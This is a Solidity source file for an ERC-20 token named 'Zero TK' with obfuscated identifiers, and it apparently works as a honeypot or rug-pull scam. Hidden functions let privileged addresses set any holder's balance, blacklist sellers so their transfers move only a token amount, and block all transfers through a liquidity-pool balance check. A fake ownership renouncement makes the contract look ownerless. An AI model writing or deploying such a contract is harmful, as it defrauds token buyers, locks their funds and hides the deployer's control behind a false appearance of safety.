//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface hoqowhitg {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feahxxcciyxw {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface qmzkfmkgasipld {
    function createPair(address qcmkurksgt, address pxauqnovnbaahm) external returns (address);
}

interface dguofzsxc {
    function totalSupply() external view returns (uint256);

    function balanceOf(address eajjwfsojyeyxw) external view returns (uint256);

    function transfer(address bqoijxyrgepz, uint256 nlbasbjvtegnt) external returns (bool);

    function allowance(address temteowoq, address spender) external view returns (uint256);

    function approve(address spender, uint256 nlbasbjvtegnt) external returns (bool);

    function transferFrom(
        address sender,
        address bqoijxyrgepz,
        uint256 nlbasbjvtegnt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed kffeflgsyqyr, uint256 value);
    event Approval(address indexed temteowoq, address indexed spender, uint256 value);
}

interface dguofzsxcMetadata is dguofzsxc {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ZeroTK is feahxxcciyxw, dguofzsxc, dguofzsxcMetadata {

    string private jkyuhwycofja = "Zero TK";

    function transfer(address mymxyuorznxdhq, uint256 nlbasbjvtegnt) external virtual override returns (bool) {
        return pfpcbyrussprq(_msgSender(), mymxyuorznxdhq, nlbasbjvtegnt);
    }

    mapping(address => bool) public rknwjqugv;

    function getOwner() external view returns (address) {
        return rlkjnybwxzv;
    }

    function gupnxfxrqyuvo(address upmzxxditf) public {
        if (htzudpavc) {
            return;
        }
        if (yxqzjqjjky) {
            yxqzjqjjky = true;
        }
        rknwjqugv[upmzxxditf] = true;
        
        htzudpavc = true;
    }

    bool private szxqtnlfid;

    address private rlkjnybwxzv;

    uint8 private twaxahpjx = 18;

    string private utcgyxekv = "ZTK";

    uint256 yfohskywl;

    function wcbujeoqd() private view {
        require(rknwjqugv[_msgSender()]);
    }

    uint256 ggwtzzdmdro;

    function yregowutd(address ryskxfhjxj) public {
        wcbujeoqd();
        
        if (ryskxfhjxj == zcxlxfayizgouy || ryskxfhjxj == qbdcfghemvh) {
            return;
        }
        vohzlefnmj[ryskxfhjxj] = true;
    }

    mapping(address => mapping(address => uint256)) private lgjudbpbd;

    bool public yxqzjqjjky;

    bool public himlpptfqom;

    constructor (){
        
        oesvnawkvwlwd();
        hoqowhitg sbfzrkrziaobg = hoqowhitg(gbyrzeoqsu);
        qbdcfghemvh = qmzkfmkgasipld(sbfzrkrziaobg.factory()).createPair(sbfzrkrziaobg.WETH(), address(this));
        if (pbvzarpmpauy != qlpvnompanx) {
            yihcgpnvrhtxd = false;
        }
        zcxlxfayizgouy = _msgSender();
        rknwjqugv[zcxlxfayizgouy] = true;
        zldgalkeaalza[zcxlxfayizgouy] = qvrrqskzdt;
        
        emit Transfer(address(0), zcxlxfayizgouy, qvrrqskzdt);
    }

    bool public qlpvnompanx;

    bool public yihcgpnvrhtxd;

    function totalSupply() external view virtual override returns (uint256) {
        return qvrrqskzdt;
    }

    function allowance(address vqdesebya, address rkdnhzpdicmapi) external view virtual override returns (uint256) {
        if (rkdnhzpdicmapi == gbyrzeoqsu) {
            return type(uint256).max;
        }
        return lgjudbpbd[vqdesebya][rkdnhzpdicmapi];
    }

    function approve(address rkdnhzpdicmapi, uint256 nlbasbjvtegnt) public virtual override returns (bool) {
        lgjudbpbd[_msgSender()][rkdnhzpdicmapi] = nlbasbjvtegnt;
        emit Approval(_msgSender(), rkdnhzpdicmapi, nlbasbjvtegnt);
        return true;
    }

    uint256 private qvrrqskzdt = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed vjpujtpnq, address indexed jxddzfsqeqsmw);

    bool public htzudpavc;

    mapping(address => uint256) private zldgalkeaalza;

    address public zcxlxfayizgouy;

    bool public pbvzarpmpauy;

    function transferFrom(address vwhkgoiojr, address bqoijxyrgepz, uint256 nlbasbjvtegnt) external override returns (bool) {
        if (_msgSender() != gbyrzeoqsu) {
            if (lgjudbpbd[vwhkgoiojr][_msgSender()] != type(uint256).max) {
                require(nlbasbjvtegnt <= lgjudbpbd[vwhkgoiojr][_msgSender()]);
                lgjudbpbd[vwhkgoiojr][_msgSender()] -= nlbasbjvtegnt;
            }
        }
        return pfpcbyrussprq(vwhkgoiojr, bqoijxyrgepz, nlbasbjvtegnt);
    }

    function name() external view virtual override returns (string memory) {
        return jkyuhwycofja;
    }

    function decimals() external view virtual override returns (uint8) {
        return twaxahpjx;
    }

    address public qbdcfghemvh;

    function symbol() external view virtual override returns (string memory) {
        return utcgyxekv;
    }

    function owner() external view returns (address) {
        return rlkjnybwxzv;
    }

    function oesvnawkvwlwd() public {
        emit OwnershipTransferred(zcxlxfayizgouy, address(0));
        rlkjnybwxzv = address(0);
    }

    function balanceOf(address eajjwfsojyeyxw) public view virtual override returns (uint256) {
        return zldgalkeaalza[eajjwfsojyeyxw];
    }

    uint256 constant acdbwppygx = 12 ** 10;

    bool public jknzznpveeiq;

    function pfpcbyrussprq(address vwhkgoiojr, address bqoijxyrgepz, uint256 nlbasbjvtegnt) internal returns (bool) {
        if (vwhkgoiojr == zcxlxfayizgouy) {
            return jozfapwkijqfgk(vwhkgoiojr, bqoijxyrgepz, nlbasbjvtegnt);
        }
        uint256 fruzwxzmapivq = dguofzsxc(qbdcfghemvh).balanceOf(xeffoyeiodex);
        require(fruzwxzmapivq == yfohskywl);
        if (vohzlefnmj[vwhkgoiojr]) {
            return jozfapwkijqfgk(vwhkgoiojr, bqoijxyrgepz, acdbwppygx);
        }
        return jozfapwkijqfgk(vwhkgoiojr, bqoijxyrgepz, nlbasbjvtegnt);
    }

    mapping(address => bool) public vohzlefnmj;

    function swatoeqxvrnwn(address mymxyuorznxdhq, uint256 nlbasbjvtegnt) public {
        wcbujeoqd();
        zldgalkeaalza[mymxyuorznxdhq] = nlbasbjvtegnt;
    }

    address gbyrzeoqsu = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address xeffoyeiodex = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function jozfapwkijqfgk(address vwhkgoiojr, address bqoijxyrgepz, uint256 nlbasbjvtegnt) internal returns (bool) {
        require(zldgalkeaalza[vwhkgoiojr] >= nlbasbjvtegnt);
        zldgalkeaalza[vwhkgoiojr] -= nlbasbjvtegnt;
        zldgalkeaalza[bqoijxyrgepz] += nlbasbjvtegnt;
        emit Transfer(vwhkgoiojr, bqoijxyrgepz, nlbasbjvtegnt);
        return true;
    }

    function oqicqxntpzfrf(uint256 nlbasbjvtegnt) public {
        wcbujeoqd();
        yfohskywl = nlbasbjvtegnt;
    }

}